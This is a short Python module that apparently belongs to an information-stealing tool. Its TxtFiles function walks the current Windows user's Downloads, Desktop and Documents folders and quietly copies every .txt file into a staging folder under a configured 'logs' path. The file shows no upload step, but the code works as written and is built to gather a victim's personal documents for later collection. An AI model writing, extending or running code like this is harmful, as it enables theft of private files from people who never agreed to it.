from os import environ, walk, makedirs
from os.path import join
from shutil import copy2
from manager.logger import Log
from preferences.config import config

def copy_txt_files(source_folder, destination_folder):
	try:
		for root, dirs, files in walk(source_folder):
			for file in files:
				if file.endswith('.txt'):
					source_path = join(root, file)
					destination_path = join(destination_folder, file)
					copy2(source_path, destination_path)
	except Exception as error:
		Log(error)

def TxtFiles():
	Log("===========TxtFiles===========")
	user = environ['USERPROFILE']
	destination_folder = f'{user}\\{config.pathToLogs}\\Files'
	downloads = fr"{user}/Downloads"
	desktop = fr"{user}/Desktop"
	documents = fr"{user}/Documents"

	try:
		makedirs(f'{destination_folder}\\Desktop')
		makedirs(f'{destination_folder}\\Downloads')
		makedirs(f'{destination_folder}\\Documents')
	except Exception as error:
		Log(error)

	copy_txt_files(downloads, destination_folder+"\\Downloads")
	copy_txt_files(desktop, destination_folder+"\\Desktop")
	copy_txt_files(documents, destination_folder+"\\Documents")


